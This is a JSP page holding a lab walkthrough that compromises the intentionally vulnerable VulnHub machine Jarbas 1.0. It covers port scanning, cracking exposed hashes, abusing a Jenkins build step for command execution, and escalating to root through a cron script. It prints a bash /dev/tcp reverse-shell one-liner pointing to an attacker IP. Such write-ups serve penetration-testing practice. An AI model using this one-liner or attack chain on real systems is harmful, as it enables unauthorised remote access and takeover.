<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html >
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>

<link rel="stylesheet" type="text/css" href='/css/main.css'>
</head>
<body>
	<div class="container">
        <p>Hello <span class="white">${user.getFirstName()}!</span> |
            <a href="/logout">Sign out</a>
        </p><br>

        <h2> JARBAS 1.0 <span class="white">WALKTHROUGH</span></h2>
        <p>Jarbas 1.0 is an intentionally vulnerable machine that was created by Tiago Tavares, it looks like a search engine, a tribute to a nostalgic Brazilian search engine in the end of 90’s.. You will need to compromise it and get root. You can download this vulnhub machine <a href="https://www.vulnhub.com/entry/jarbas-1,232/">here</a></p><br> 
        <div class="enumeration">
        
        <h2> TARGET <span class="white">DISCOVERY</span></h2>
            <p>Command: <span class="white">arp-scan -l</span></p><br>		
        
         <img src="/img/jarbas_image/jarbas_target_discovery.png" alt="targetdiscovery"/> 
        </div><br>
        <div class="nmap">
          
            <h2> NMAP <span class="white">SCANNING</span></h2>
            <p>Command: <span class="white">nmap -sS -PN -n -sV -sC -p- 192.168.50.170</span></p><br>			
          
            <img src="/img/jarbas_image/jarbas_nmap_scan.png" alt="nmapscan"/>
            <p>We have port 22, 80, 8080, and 3306</p>
            <p>Checking port 80 & 8080, let us start by checking port 80.</p><br>
            <h3>Port 80</h3>	
        </div>
        <div class="nikto">
           
            <h2> SCANNING TARGET PORT 80 WITH <span class="white">NIKTO</span></h2>
           
            <p>Command: <span class="white">nikto -h 192.168.50.170</span></p><br>			
            
           <img src="/img/jarbas_image/jarbas_nikto_port80_scan.png" alt="niktoscan"/><br>
            <p>Nothing much is revealed here, time to check the web app gui to see how it looks like. Nothing to attack Tiger, be patient.</p>			
        </div>
        <div class="parallax">		
        </div>
        <div class="webappgui">
            
            <h2> ACCESSING THE <span class="white">WEB APP</span></h2>
            <p>The web app reveals a search engine in a portuguese language, Tiger will explore the source page in a few minutes to see what lies deeper in the jungle.</p><br>		
           
            <img src="/img/jarbas_image/jarbas_web_gui.png" alt="webgui"/><br>
            <p>What do we have? Nothing much, time to poke around and check port 8080.</p>		
        </div><br>
        <div class="parallax">
            
        </div>
        <div class="nikto">
           
            <h2> SCANNING TARGET PORT 8080 WITH <span class="white">NIKTO</span></h2>
            
            <p>Command: <span class="white">nikto -h 192.168.50.170:8080</span></p><br>		
            
            <img src="/img/jarbas_image/jarbas_nikto_port8080_scan.png" alt="niktoscan8080"/><br>
            <p>Tiger, what do we see here? Jenkins, you are not dreaming. Jenkins usually has a lot of vulnerabilities, this could be our way in if we get lucky.</p><br>
            
            <img src="/img/jarbas_image/jarbas_jenkins_vulnerabilities.png" alt="jenkinsvulns"/>		
        </div>
        <div class="parallax">			
        </div>
        <div class="webappgui8080">
   
            <h2> ACCESSING THE WEB APP ON <span class="white">PORT 8080</span> </h2>
            <p>Our suspiscion is confirmed, we have our jenkins login form.</p>			
            
            <img src="/img/jarbas_image/jarbas_jenkins_login.png" alt="webgui8080"/><br>
            <p>What do we have? Nothing much, time to poke around and check port 8080.</p>		
        </div><br>
    
        <div class="webappgui8080">
  
            <h2> DIRECTORY <span class="white">BRUTEFORCING</span> </h2>	
            <p>Two directories are discovered when we do directory bruteforcing on port 80.</p>			
            
            <img src="/img/jarbas_image/jarbas_directory_bruteforcing.png" alt="brutefocingdirectory"/><br>
            <p>As we had already accessed the index page on port 80, we need to first check the access.html page to find something for tiger. Let us see what is going with these directories.. bingo we got hashes</p>	<br>
            
            <img src="/img/jarbas_image/jarbas_access_html_page_hashes.png" alt="hashes"/><br>	<br>	
            <p>tiago: <span class="white">5978a63b4654c73c60fa24f836386d87</span> </p>
            <p>trindade: <span class="white">f463f63616cb3f1e81ce46b39f882fd5</span> </p>
            <p>eder: <span class="white">9b38e2b1e8b12f426b0d208a7ab6cb98</span> </p>
            
            
            <img src="/img/jarbas_image/jarbas_hashkiller_results.png" alt="hashkiller"/><br>
        </div><br>
        <div class="parallax">			
        </div>
        <div class="jenkinsloggingin">
            
            <h2> LOGGING INTO <span class="white">JENKINS</span> </h2><br>
            <p>Checking on port 8080 which has jetty 9.4.z Snapshot, I am taken to a Jenkins page and managed to get in with creds eder and vipsu.</p><br>		
           
            <img src="/img/jarbas_image/jarbas_jenkins_homepage_loggedin.png" alt="webgui8080"/><br><br>
            <p>
            To execute commands, click on a new item and choose name of the project. Click apply then choose build down below choose execute shell command form, once it is open, you will insert your commands and starting poking the app.</p><br>
          
            <img src="/img/jarbas_image/jarbas_reverseshell_config.png" alt="webgui8080"/><br><br>
            
            <h2> CHECKING FOR INSTALLED <span class="white">PROGRAMS</span> </h2><br>
            <p>#!/bin/bash</p>
            <p>id</p>
            <p>cat /proc/version</p>
            <p>ls /bin</p>
            <p>ls /usr/bin</p>
            <p>ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'</p>	
            
            <img src="/img/jarbas_image/jarbas_jenkins_data_enumeration.png" alt="webgui8080"/><br><br>	
            <p>jenkins is the user</p>
        
            <img src="/img/jarbas_image/jarbas_jenkins_data_enumeration_results.png" alt="webgui8080"/><br><br>
            <img src="/img/jarbas_image/jarbas_jenkins_data_enumeration_results.png" alt="webgui8080"/><br><br>
            <p>python 2.7 is installed</p>
            
            <img src="/img/jarbas_image/jarbas_jenkins_data_enumeration_results_1.png" alt="webgui8080"/><br><br>
            <div class="parallax">			
            </div>
            
            <h2> LIMITED SHELL WITH A <span class="white">ONELINER</span> </h2>
            <p>I tried a couple of tools to get a shell, I realized nc and telnet were not installed then I use the below oneliner:</p>
            
            <p>Command: <span class="white">/bin/bash -i > /dev/tcp/192.168.50.141/443 0<&1 2>&1</span></p><br>	
            <p>This is one of those "hacks" that a reverse shell takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system. It's not always available, but can be quite handy when it is. <a href="https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools">Oneliners</a></p>
          
            <img src="/img/jarbas_image/jarbas_limited_shell_oneliner.png" alt="webgui8080"/><br><br>
            <p>We have a shell</p>
            <img src="/img/jarbas_image/jarbas_limited_shell_oneliner_we_are_in.png" alt="webgui8080"/><br>
            
            <h2> LIMITED SHELL WITH <span class="white">PYTHON</span> </h2>
            <p>Step 1</p>
        
            
             <img src="/img/jarbas_image/jarbas_limited_python_oneliner.png" alt="pythonwearein"/><br>
            <p>Step 2</p>
            <img src="/img/jarbas_image/jarbas_limited_python_oneliner_we_are_in.png" alt="wearein"/><br>
            <div class="parallax">			
            </div>
            <h2> PRIVILEGE <span class="white">ESCALATION</span></h2>
            <p>Confirming installed programs</p>
        
    
            <img src="/img/jarbas_image/jarbas_privesc1.png" alt="installed programs"/><br>
            <p>Where to write to and execute from /tmp, /var/tmp, /dev/shm, etc</p>
            <img src="/img/jarbas_image/jarbas_privesc2.png" alt="folders to execute from"/><br>
            <p>Installed programs</p>
            <img src="/img/jarbas_image/jarbas_privesc3.png" alt="installed programs"/><br>
            <p>Listing cron jobs</p>
            <img src="/img/jarbas_image/jarbas_privesc4.png" alt="cronjobs listing"/><br> 
    
            <div class="parallax">			
            </div>
            <p>Digging deeper for cron jobs</p>                     
            <img src="/img/jarbas_image/jarbas_privesc5.png" alt="cronjobs from spool"/><br>	
            <p>A cron job file is found /etc/script/CleaningScript.sh</p>
            <img src="/img/jarbas_image/jarbas_privesc6.png" alt="wearein"/><br>
            <p>Examining the cron job file</p>
            <img src="/img/jarbas_image/jarbas_privesc7.png" alt="cron jobs in etc file"/><br>
            <p>Creating a python oneliner from attacker machine</p>
            <img src="/img/jarbas_image/jarbas_privesc8.png" alt="Cron job found"/><br>
            <p>Editing the evil oneline with vi editor</p>
            <img src="/img/jarbas_image/jarbas_privesc9.png" alt="analysis of found cronjob"/><br>
            <p>Setting a PHP server to download the file</p>
            <img src="/img/jarbas_image/jarbas_privesc10.png" alt="oneliner on attacker"/><br>
            <div class="parallax">			
            </div>
            <p>Download the evil oneline and execute under /tmp</p>
            <img src="/img/jarbas_image/jarbas_privesc11.png" alt="wearein"/><br>
            <p>Booommmmmmmmm we got root</p>
            <img src="/img/jarbas_image/jarbas_privesc12.png" alt="wearein"/><br>
        </div><br>
            <p> <span class="white">A very big thank you goes to the creator of this amazing machine, Tiago Tavares.</span> </p><br>
        </div>

</body>
</html>